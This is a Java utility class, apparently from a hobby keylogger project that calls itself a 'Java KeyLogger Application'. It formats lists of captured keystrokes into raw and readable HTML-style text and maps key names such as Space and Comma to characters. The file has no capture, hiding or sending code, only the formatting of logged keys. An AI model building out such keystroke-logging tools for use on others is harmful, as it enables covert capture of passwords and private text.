package org.nick.handlers;

import java.util.List;

/**
 * 
 * @author NICK
 *
 */
public final class Utils {

	private Utils() {
		
	}
	
	public static boolean isShiftPressed;
	
	public static String rawPrint(List<KeyStorage> storage) {
		if(storage.isEmpty()) {
			return "Nothing has been pressed";
		}
		StringBuilder sb = new StringBuilder();
		sb.append("<br> Raw Stroke Data: <br>");
		for(KeyStorage keyStorage : storage) {
			sb.append(keyStorage.toString() + System.lineSeparator());
		}
		return sb.toString();
		
	}
	
	/**
	 * 
	 * @param storage, the list of keys hitted
	 * @return the keys were hitted in a pretty format
	 */
	public static String prettyPrintLogs(List<KeyStorage> storage) {
		if(storage.isEmpty()) {
			return "Nothing has been pressed";
		}
		StringBuilder sb = new StringBuilder();
		sb.append("<br> Java KeyLogger Application <br>");
        for(KeyStorage keystorage : storage) {
			System.out.println("Shift is pressed: " + Utils.isShiftPressed);
			String keyword = keystorage.getLetter();
			
			if(keyword.length() > 1) { //if the key is a standar keywoard (f.e space) 
			    keyword = convertKeyword(keystorage.getLetter());
				sb.append(keyword);
				continue;
			}
			else {
				sb.append(keyword);
			}
			
		}
		return sb.toString();
	}

	
	private static String convertKeyword(String key) {
		if(key.equals("Space") || key.equals("space")) {
			return " ";
		}
		else if(key.equals("Comma") || key.equals("comma")) {
			return ",";
		}
		else if(key.equals("LEFT SHIFT") || key.equals("RIGHT SHIFT") || key.equals("tab")) {
			return "";
		}
		else if(key.equals("tab")) {
			
		}
		
		if(key.length() > 1) {
			return "{"+key+"}";
		}
		
		
		return key;
	}
	
	
}
